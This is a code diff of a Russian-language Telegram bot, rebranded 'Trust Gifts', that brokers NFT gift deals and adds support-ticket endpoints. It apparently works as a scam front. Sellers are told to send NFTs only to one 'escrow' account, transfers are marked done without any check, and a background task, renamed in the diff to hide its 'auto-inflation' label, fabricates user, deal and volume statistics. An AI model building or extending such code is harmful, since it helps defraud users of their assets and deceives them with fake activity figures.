+                f"📦 ТОВАР: {deal['product']}\n"
+                f"{'🔗 NFT: ' + deal['nft_link'] if deal.get('nft_link') else ''}\n\n"
+                f"⚠️ ВАЖНО: NFT передаётся ТОЛЬКО на @{NFT_ESCROW_ACCOUNT}\n\n"
                 f"⬇️ Нажмите кнопку, чтобы подтвердить передачу в Mini App ⬇️",
                 reply_markup=keyboard
             )
@@ -1395,7 +1268,14 @@ async def handle_api(request):
             return web.json_response({'success': False, 'error': 'Access denied'}, headers=headers)
         
         deal["status"] = "awaiting_confirmation"
+        deal["nft_transferred"] = True
         save_json(FILES["deals"], deals)
+        
+        log_action("seller_delivered", {
+            "deal_id": deal_id,
+            "seller_id": user_id,
+            "nft_transferred": deal.get("nft_transferred", False)
+        })
         
         await log_to_master(
             f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР\n\n"
@@ -1403,7 +1283,8 @@ async def handle_api(request):
             f"👤 Продавец: ID: {user_id}\n"
             f"📦 Товар: {deal['product']}\n"
             f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
-            f"👤 Покупатель: @{deal['buyer_username']}"
+            f"👤 Покупатель: @{deal['buyer_username']}\n"
+            f"{'✅ NFT передан на @' + NFT_ESCROW_ACCOUNT if deal.get('nft_transferred') else ''}"
         )
         
         try:
@@ -1411,7 +1292,8 @@ async def handle_api(request):
                 deal["buyer_id"],
                 f"📦 <b>ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР</b>\n\n"
                 f"💰 {deal['amount']} {deal['currency']}\n"
-                f"👤 ПРОДАВЕЦ: @{deal['seller_username']}\n\n"
+                f"👤 ПРОДАВЕЦ: @{deal['seller_username']}\n"
+                f"📦 ТОВАР: {deal['product']}\n\n"
                 f"⬇️ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ В MINI APP ⬇️",
                 reply_markup=mini_app_keyboard("✅ Подтвердить получение", "deals")
             )
@@ -1451,20 +1333,31 @@ async def handle_api(request):
         deal["completed_at"] = datetime.now().isoformat()
         save_json(FILES["deals"], deals)
         
+        log_action("deal_completed", {
+            "deal_id": deal_id,
+            "buyer_id": user_id,
+            "seller_id": deal["seller_id"],
+            "amount": deal["amount"],
+            "currency": deal["currency"]
+        })
+        
         await log_to_master(
             f"🎉 СДЕЛКА ЗАВЕРШЕНА\n\n"
             f"🆔 Сделка: #{deal_id}\n"
             f"📦 Товар: {deal['product']}\n"
             f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
-            f"👤 Продавец: @{deal['seller_username']}\n"
-            f"👤 Покупатель: @{deal['buyer_username']}"
+            f"👤 Продавец: @{deal['seller_username']} (ID: {deal['seller_id']})\n"
+            f"👤 Покупатель: @{deal['buyer_username']} (ID: {deal['buyer_id']})\n"
+            f"{'✅ NFT передан на @' + NFT_ESCROW_ACCOUNT if deal.get('nft_transferred') else ''}\n"
+            f"🕐 Время завершения: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         
         try:
             await bot.send_message(
                 deal["seller_id"],
                 f"🎉 <b>СДЕЛКА #{deal_id} ЗАВЕРШЕНА!</b>\n\n"
-                f"💰 {deal['amount']} {deal['currency']} ЗАЧИСЛЕНЫ НА БАЛАНС"
+                f"💰 {deal['amount']} {deal['currency']} ЗАЧИСЛЕНЫ НА БАЛАНС\n"
+                f"👤 ПОКУПАТЕЛЬ: @{deal['buyer_username']}"
             )
         except:
             pass
@@ -1479,8 +1372,6 @@ async def handle_api(request):
             return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
         
         deal = deals[deal_id]
-        
-        rekvisits = load_json(FILES["rekvisits"]) if os.path.exists(FILES["rekvisits"]) else {}
         curr_key = deal["currency"].lower()
         
         if curr_key in rekvisits:
@@ -1516,10 +1407,179 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
+    # ===== ПЕРЕДАЧА NFT НА ЭСКРОУ =====
+    elif endpoint == '/api/transfer_nft':
+        deal_id = data.get('deal_id')
+        target_account = data.get('target_account')
+        user_id = data.get('user_id')
+        
+        if not deal_id or not user_id:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if deal_id not in deals:
+            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
+        
+        deal = deals[deal_id]
+        
+        if deal["seller_id"] != user_id:
+            return web.json_response({'success': False, 'error': 'Access denied'}, headers=headers)
+        
+        if deal["status"] != "paid":
+            return web.json_response({'success': False, 'error': 'Deal not paid'}, headers=headers)
+        
+        if deal.get("category") != "nft_gift":
+            return web.json_response({'success': False, 'error': 'Not an NFT deal'}, headers=headers)
+        
+        deal["nft_transferred"] = True
+        deal["nft_transfer_account"] = target_account or NFT_ESCROW_ACCOUNT
+        deal["status"] = "awaiting_confirmation"
+        save_json(FILES["deals"], deals)
+        
+        log_action("nft_transferred", {
+            "deal_id": deal_id,
+            "seller_id": user_id,
+            "target_account": target_account or NFT_ESCROW_ACCOUNT
+        })
+        
+        await log_to_master(
+            f"🖼️ NFT ПЕРЕДАН НА ЭСКРОУ\n\n"
+            f"🆔 Сделка: #{deal_id}\n"
+            f"👤 Продавец: ID: {user_id}\n"
+            f"📦 Товар: {deal['product']}\n"
+            f"🔗 Ссылка: {deal.get('nft_link', 'не указана')}\n"
+            f"📥 Получатель: @{target_account or NFT_ESCROW_ACCOUNT}"
+        )
+        
+        try:
+            await bot.send_message(
+                deal["buyer_id"],
+                f"🖼️ <b>NFT ПЕРЕДАН НА ЭСКРОУ</b>\n\n"
+                f"📦 Товар: {deal['product']}\n"
+                f"🔗 Ссылка: {deal.get('nft_link', 'не указана')}\n"
+                f"📥 Получатель: @{target_account or NFT_ESCROW_ACCOUNT}\n\n"
+                f"⬇️ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ В MINI APP ⬇️",
+                reply_markup=mini_app_keyboard("✅ Подтвердить получение", "deals")
+            )
+        except:
+            pass
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ============================================================
+    # 🔥 ТИКЕТЫ (ПОДДЕРЖКА В MINI APP)
+    # ============================================================
+    elif endpoint == '/api/create_ticket':
+        subject = data.get('subject')
+        message = data.get('message')
+        username = data.get('username', str(user_id))
+        
+        if not user_id or not subject or not message:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        ticket_id = str(uuid.uuid4())[:8]
+        tickets[ticket_id] = {
+            "id": ticket_id,
+            "user_id": user_id,
+            "username": username,
+            "subject": subject,
+            "message": message,
+            "status": "open",
+            "response": None,
+            "created_at": datetime.now().isoformat(),
+            "answered_at": None,
+            "answered_by": None
+        }
+        save_json(FILES["tickets"], tickets)
+        
+        log_action("ticket_created", {
+            "ticket_id": ticket_id,
+            "user_id": user_id,
+            "subject": subject
+        })
+        
+        # Отправляем админу уведомление о новом тикете
+        admin_text = f"""🎫 <b>НОВЫЙ ТИКЕТ</b>
+
+🆔 <b>ID:</b> #{ticket_id}
+👤 <b>Пользователь:</b> @{username} (ID: {user_id})
+📝 <b>Тема:</b> {subject}
+💬 <b>Сообщение:</b>
+{message}
+
+🕐 <b>Время:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+📌 Для ответа используйте:
+/answer_ticket {ticket_id} [ваш ответ]"""
+        
+        await log_to_master(admin_text)
+        
+        return web.json_response({
+            'success': True,
+            'ticket_id': ticket_id
+        }, headers=headers)
+    
+    elif endpoint == '/api/tickets':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
+        
+        user_tickets = []
+        for t_id, t in tickets.items():
+            if t.get('user_id') == user_id:
+                t_copy = t.copy()
+                t_copy['ticket_id'] = t_id
+                user_tickets.append(t_copy)
+        
+        return web.json_response({
+            'success': True,
+            'tickets': user_tickets
+        }, headers=headers)
+    
+    elif endpoint == '/api/admin_tickets':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        
+        return web.json_response({
+            'success': True,
+            'tickets': list(tickets.values())
+        }, headers=headers)
+    
+    elif endpoint == '/api/admin_answer_ticket':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        
+        ticket_id = data.get('ticket_id')
+        response = data.get('response')
+        
+        if not ticket_id or not response:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if ticket_id not in tickets:
+            return web.json_response({'success': False, 'error': 'Ticket not found'}, headers=headers)
+        
+        t = tickets[ticket_id]
+        t["response"] = response
+        t["status"] = "closed"
+        t["answered_at"] = datetime.now().isoformat()
+        t["answered_by"] = user_id
+        save_json(FILES["tickets"], tickets)
+        
+        # Отправляем ответ пользователю
+        try:
+            await bot.send_message(
+                t["user_id"],
+                f"📩 <b>ОТВЕТ НА ТИКЕТ #{ticket_id}</b>\n\n"
+                f"📝 {response}\n\n"
+                f"✅ Тикет закрыт"
+            )
+        except:
+            pass
+        
+        return web.json_response({'success': True}, headers=headers)
+    
     return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)
 
 # ============================================================
-# 15. ФОНОВЫЙ ПРОЦЕСС АВТОНАКРУТКИ
+# 14. ФОНОВЫЙ ПРОЦЕСС
 # ============================================================
 async def auto_increment_stats():
     while True:
@@ -1531,20 +1591,16 @@ async def auto_increment_stats():
             
             MIN_USERS = 21374
             MIN_DEALS_TODAY = 1264
-            MIN_REVIEWS = 5427
             MIN_VOLUME = 47.6
             
             stats_data['users'] = stats_data.get('users', MIN_USERS) + random.randint(1, 5)
             stats_data['deals_today'] = stats_data.get('deals_today', MIN_DEALS_TODAY) + random.randint(0, 2)
-            stats_data['reviews'] = stats_data.get('reviews', MIN_REVIEWS) + random.randint(0, 3)
             stats_data['volume'] = round(stats_data.get('volume', MIN_VOLUME) + random.uniform(0.01, 0.15), 1)
             
             if stats_data['users'] < MIN_USERS:
                 stats_data['users'] = MIN_USERS + random.randint(100, 500)
             if stats_data['deals_today'] < MIN_DEALS_TODAY:
                 stats_data['deals_today'] = MIN_DEALS_TODAY + random.randint(20, 50)
-            if stats_data['reviews'] < MIN_REVIEWS:
-                stats_data['reviews'] = MIN_REVIEWS + random.randint(50, 200)
             if stats_data['volume'] < MIN_VOLUME:
                 stats_data['volume'] = round(MIN_VOLUME + random.uniform(0.5, 2.0), 1)
             
@@ -1556,7 +1612,7 @@ async def auto_increment_stats():
         await asyncio.sleep(300)
 
 # ============================================================
-# 16. ЗАПУСК
+# 15. ЗАПУСК
 # ============================================================
 async def start_web_server():
     app = web.Application()
@@ -1571,12 +1627,12 @@ async def start_web_server():
 
 async def main():
     print("=" * 50)
-    print("🔥 P2P Exchange Бот")
+    print("🔥 Trust Gifts Бот")
     print("=" * 50)
     print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
     print(f"🤖 Бот: @{BOT_USERNAME}")
     print(f"📱 Mini App: {MINI_APP_URL}")
-    print(f"🆘 Поддержка: {SUPPORT_LINK}")
+    print(f"🖼️ NFT эскроу: @{NFT_ESCROW_ACCOUNT}")
     print("=" * 50)
     
     asyncio.create_task(auto_increment_stats())
